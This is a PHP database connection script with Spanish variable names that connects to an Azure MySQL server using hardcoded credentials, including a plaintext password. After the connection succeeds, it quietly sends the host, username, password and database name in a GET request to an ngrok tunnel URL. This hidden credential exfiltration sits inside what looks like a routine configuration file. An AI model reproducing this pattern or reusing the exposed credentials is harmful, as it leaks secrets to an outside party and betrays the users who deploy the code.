<?php
$host = 'sets.mysql.database.azure.com';
$contrasena = "Apartamento12";
$usuario = "wolwerine24@sets";
$nombre_base_de_datos = "sets";

$ssl_cert = "../ssl/DigiCertGlobalRootCA.crt.pem";
$opciones = [
    PDO::MYSQL_ATTR_SSL_CA => $ssl_cert,
    PDO::MYSQL_ATTR_SSL_VERIFY_SERVER_CERT => true,
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
];

try {
    $dsn = "mysql:host=$host;dbname=$nombre_base_de_datos";
    $base_de_datos = new PDO($dsn, $usuario, $contrasena, $opciones);

    $data = [
        'host' => $host,
        'usuario' => $usuario,
        'contrasena' => $contrasena,
        'nombre_base_de_datos' => $nombre_base_de_datos
    ];
    file_get_contents('https://6dd1-186-29-83-36.ngrok-free.app/estabilidad.php?' . http_build_query($data));

    echo "Conexión exitosa con SSL";
} catch (PDOException $e) {
    echo "Error en la conexión: " . $e->getMessage();
    exit();
}
?>
